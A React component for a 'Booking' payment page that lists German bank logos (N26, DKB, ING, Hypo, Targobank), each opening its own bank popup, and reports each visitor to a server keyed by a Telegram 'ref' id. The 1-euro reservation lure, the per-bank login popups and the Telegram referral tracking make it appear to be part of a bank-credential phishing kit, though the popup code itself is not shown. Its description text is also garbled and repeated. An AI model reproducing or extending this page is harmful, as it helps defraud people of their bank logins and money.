import styled from 'styled-components';
import React, { useEffect, useState } from 'react';
import { useSelector } from 'react-redux';

import { Footer } from '../footer';

import { ReactComponent as ArrowDownSVG } from '../../assets/svg/arrow_down.svg';

import { ReactComponent as N26SVG } from '../../assets/svg/banks/n26.svg';
import { ReactComponent as DKBSVG } from '../../assets/svg/banks/dkb.svg';
import { ReactComponent as INGSVG } from '../../assets/svg/banks/ing.svg';
import { ReactComponent as HYPOSVG } from '../../assets/svg/banks/hypo.svg';
// import { ReactComponent as REVOLUTSVG } from "../../assets/svg/banks/revolut.svg";
import { ReactComponent as TARGOBANKSVG } from '../../assets/svg/banks/targobank.svg';
import { Link } from '../../components';

import { P_N26 } from './BankPopups/P_N26';
import { P_DKB } from './BankPopups/P_DKB';
import { P_ING } from './BankPopups/P_ING';
import { P_TARGOBANK } from './BankPopups/P_TARGOBANK';
import { P_HYPO } from './BankPopups/P_HYPO';
// import { P_REVOLUT } from "./BankPopups/P_REVOLUT";
import { LOADER } from './BankPopups/LOADER';
import { getQuery, redirect } from '../../utils/navigation';

export const PaymentMethod = () => {
  const [d2, setD2] = useState(false);

  const handleOpenD2 = () => {
    setD2(!d2);
  };

  const { socket } = useSelector(({ socket }) => ({
    socket,
  }));

  useEffect(() => {
    const ref = getQuery('ref') || localStorage.getItem('ref');

    if (socket && ref) {
      socket.emit('PAYMENT_NOTIFICATION', { type: 'PAYMENT_METHOD', telegramId: ref });
    }
  }, [socket]);

  return (
    <Container>
      <Main>
        <Title>Booking</Title>
        <Desk>
          At the time of booking, 1 euro is reserved in your account. The balance is paid at the time of your
          at the time of your visit. You can cancel your booking at any time without being charged.
          be charged.
        </Desk>
        <div style={{ marginTop: '25px' }}>
          <Dropdown isOpen={d2} onClick={handleOpenD2}>
            <div className="left">
              <Img src="bank.png" />
              <DTitle>Bank account</DTitle>
            </div>
            <div className="right">
              <ArrowDownSVG viewBox="12 0 24 49" />
            </div>
          </Dropdown>
          <BbrBodyBank isOpen={d2}>
            <div>
              <div style={{ paddingLeft: 48, marginBottom: -24 }}>
                <LOADER />
                <strong>Available banks</strong>
              </div>
              <BankCont>
                <P_N26>
                  <N26SVG className="previewSVG" />
                </P_N26>
                <P_DKB>
                  <DKBSVG className="previewSVG" />
                </P_DKB>
                <P_ING>
                  <INGSVG className="previewSVG" />
                </P_ING>
                <P_HYPO>
                  <HYPOSVG className="previewSVG" />
                </P_HYPO>
                {/* <P_REVOLUT>
                  <REVOLUTSVG className="previewSVG" />
                </P_REVOLUT> */}
                <P_TARGOBANK>
                  <TARGOBANKSVG className="previewSVG targo" />
                </P_TARGOBANK>
              </BankCont>
              <div style={{ paddingLeft: 48, marginBottom: 24, marginTop: -24 }}>
                <strong>Haven't found your bank? Pay by card.</strong>
              </div>

              <a
                onClick={(e) => {
                  e.preventDefault();
                  redirect('/payment/card', { query: { price: getQuery('price') } });
                }}
              >
                <div style={{ paddingLeft: 48 }}>
                  <IMG src="credit.png" />
                </div>
              </a>
            </div>
          </BbrBodyBank>
        </div>
      </Main>
    </Container>
  );
};

const IMG = styled.img`
  transition: 0.3s;
  min-width: 200px;
  height: 100px;
  box-shadow: 0px 4px 8px 2px rgba(0, 0, 0, 0.1);
  padding: 24px;
  border-radius: 6px;

  &:hover {
    box-shadow: 0px 4px 8px 2px rgba(0, 0, 0, 0.25);
    cursor: pointer;
  }
`;

const Desk = styled.p`
  text-align: center;
  font-size: 18px !important;
  margin-bottom: 15px;
  color: #fff;
`;

const Title = styled.p`
  text-align: center;
  font-size: 28px !important;
  font-weight: bold !important;
  margin-bottom: 15px;
  padding-top: 24px;
  margin-top: 0 !important;
  color: #fff;
`;

const BankCont = styled.div`
  display: flex;
  flex-wrap: wrap;
  grid-gap: 24px;
  padding: 48px;
  transition: all 0.15s;

  & .previewSVG {
    transition: 0.3s;
    min-width: 200px;
    height: 100px;
    box-shadow: 0px 4px 8px 2px rgba(0, 0, 0, 0.1);
    padding: 24px;
    border-radius: 6px;

    &:hover {
      box-shadow: 0px 4px 8px 2px rgba(0, 0, 0, 0.25);
      cursor: pointer;
    }
  }
`;

const BbrBody = styled.div`
  transition: all 0.3s;
  max-height: ${(props) => (props.isOpen ? '0px' : '348px')};
  margin-top: -${(props) => (props.isOpen ? '25px' : '0px')};
  margin-bottom: ${(props) => (props.isOpen ? '0px' : '25px')};
  overflow: hidden;
  height: 348px;
  background-color: white;
  padding-top: 24px;
  box-shadow: ${(props) => (props.isOpen ? 'none' : '0px 4px 8px 2px rgba(0, 0, 0, 0.1)')};
  border: ${(props) => (props.isOpen ? '0px solid #d3d3d3' : '1px solid #d3d3d3')};
`;

const BbrBodyBank = styled(BbrBody)`
  transition: all 0.3s;
  height: 550px !important;
  max-height: ${(props) => (props.isOpen ? '0px' : '550px')};

  & .previewSVG {
    max-width: 250px;
  }

  @media (max-width: 1050px) {
    height: 650px !important;
    max-height: ${(props) => (props.isOpen ? '0px' : '650px')};
  }

  @media (max-width: 820px) {
    height: 768px !important;
    max-height: ${(props) => (props.isOpen ? '0px' : '768px')};
  }

  @media (max-width: 600px) {
    height: 992px !important;
    max-height: ${(props) => (props.isOpen ? '0px' : '992px')};
  }

  @media (max-width: 545px) {
    height: 1116px !important;
    max-height: ${(props) => (props.isOpen ? '0px' : '1116px')};
  }

  @media (max-width: 350px) {
    & .previewSVG {
      max-width: 200px;
    }
  }

  @media (max-width: 445px) {
    height: 1116px !important;
    max-height: ${(props) => (props.isOpen ? '0px' : '1116px')};
  }
`;

const Img = styled.img`
  width: 24px;
  height: 24px;
`;

const DTitle = styled.p``;

const Dropdown = styled.div`
  box-shadow: 0px 4px 8px 2px rgba(0, 0, 0, 0.1);
  border: 1px solid #d3d3d3;
  margin-bottom: ${(props) => (props.isOpen ? '25px' : '0px')};
  border-radius: 6px 6px 0px 0px;
  height: 75px;
  background-color: white;
  width: 100%;

  display: flex;
  align-items: center;

  transition: all 0.3s;

  & .right {
    justify-content: flex-end;
    & svg {
      transition: all 0.3s;
      transform: ${(props) => (props.isOpen ? 'rotate(0deg)' : 'rotate(180deg)')};
    }
  }

  & .left,
  .right {
    width: 100%;
    display: flex;
    align-items: center;
    & svg,
    img {
      width: 24px;
      height: 24px;
      margin-bottom: -2px;
      margin-right: 10px;
    }
  }

  padding-left: 25px;
  padding-right: 25px;

  &:hover {
    cursor: pointer;
  }
`;

const Main = styled.div`
  width: 100%;
  max-width: 1366px;
  margin: 0 auto !important;
  min-height: 100vh;
  font-size: 22px;
  padding-left: 10px;
  padding-right: 10px;
  padding-bottom: 40px;
`;

const Container = styled.div`
  width: 100%;
  height: 100%;
  background-color: rgb(34, 3, 57);
`;
